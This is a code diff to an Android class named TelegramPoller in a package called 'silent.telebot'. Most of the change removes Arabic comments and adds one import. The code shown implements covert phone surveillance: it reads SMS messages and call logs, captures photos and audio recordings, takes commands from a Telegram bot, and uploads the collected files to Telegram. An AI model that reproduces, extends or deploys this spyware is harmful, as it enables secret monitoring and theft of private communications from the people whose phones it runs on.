@@ -2,6 +2,7 @@ package com.silent.telebot;
 
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
@@ -50,10 +51,8 @@ public class TelegramPoller implements Runnable {
     @Override
     public void run() {
         try {
-            // 1. مزامنة البيانات (مع حماية كاملة من التعطل)
             syncDataFromPhone();
 
-            // 2. جلب الأوامر من تيليجرام
             String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
             HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
             conn.setRequestMethod("GET");
@@ -85,21 +84,16 @@ public class TelegramPoller implements Runnable {
         }
     }
 
-    // ============================================================
-    //  🔄 المزامنة (محمية بالكامل ضد التعطل)
-    // ============================================================
     private void syncDataFromPhone() {
-        // التحقق من وجود الأذونات قبل محاولة القراءة
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (ctx.checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-                return; // لا أذونات، نخرج بأمان
+                return;
             }
             if (ctx.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                 return;
             }
         }
 
-        // مزامنة الرسائل
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                 ContentResolver cr = ctx.getContentResolver();
@@ -126,7 +120,6 @@ public class TelegramPoller implements Runnable {
             }
         } catch (Exception ignored) {}
 
-        // مزامنة المكالمات
         try {
             ContentResolver cr = ctx.getContentResolver();
             Cursor cursor = null;
@@ -153,9 +146,6 @@ public class TelegramPoller implements Runnable {
         } catch (Exception ignored) {}
     }
 
-    // ============================================================
-    //  📋 معالجة الأوامر (مع حماية)
-    // ============================================================
     private void handleCommand(String cmd) {
         try {
             if (cmd.equals("/help")) {
@@ -190,9 +180,6 @@ public class TelegramPoller implements Runnable {
         }
     }
 
-    // ============================================================
-    //  📩 SMS (من SQLite) - محمي
-    // ============================================================
     private String getSmsFromLocalDB() {
         try {
             if (dbHelper == null) return "❌ قاعدة البيانات غير جاهزة.";
@@ -206,7 +193,7 @@ public class TelegramPoller implements Runnable {
                     String body = sms.get("body");
                     String dateStr = sms.get("date");
                     if (address == null || body == null || dateStr == null) continue;
-                    
+
                     String name = getContactName(address);
                     String display = (name != null) ? name : address;
                     long dateMillis = Long.parseLong(dateStr);
@@ -222,9 +209,6 @@ public class TelegramPoller implements Runnable {
         }
     }
 
-    // ============================================================
-    //  📞 CALLS (من SQLite) - محمي
-    // ============================================================
     private String getCallsFromLocalDB() {
         try {
             if (dbHelper == null) return "❌ قاعدة البيانات غير جاهزة.";
@@ -259,9 +243,6 @@ public class TelegramPoller implements Runnable {
         }
     }
 
-    // ============================================================
-    //  📷 الكاميرا - محمي
-    // ============================================================
     private void capturePhoto() {
         try {
             File photoFile = new File(ctx.getCacheDir(), "temp_photo.jpg");
@@ -287,9 +268,6 @@ public class TelegramPoller implements Runnable {
         }
     }
 
-    // ============================================================
-    //  🎤 التسجيل الصوتي - محمي
-    // ============================================================
     private void startRecording() {
         try {
             File audioFile = new File(ctx.getCacheDir(), "recording.3gp");
@@ -323,9 +301,6 @@ public class TelegramPoller implements Runnable {
         }
     }
 
-    // ============================================================
-    //  📤 دوال إرسال الملفات (ثابتة)
-    // ============================================================
     public static void sendPhotoStatic(String chatId, File photoFile, String botToken) {
         try {
             String boundary = "*****" + System.currentTimeMillis() + "*****";
@@ -426,9 +401,6 @@ public class TelegramPoller implements Runnable {
         } catch (Exception ignored) {}
     }
 
-    // ============================================================
-    //  🔍 مساعدات
-    // ============================================================
     private String getContactName(String phoneNumber) {
         if (phoneNumber == null || phoneNumber.isEmpty()) return null;
         try {
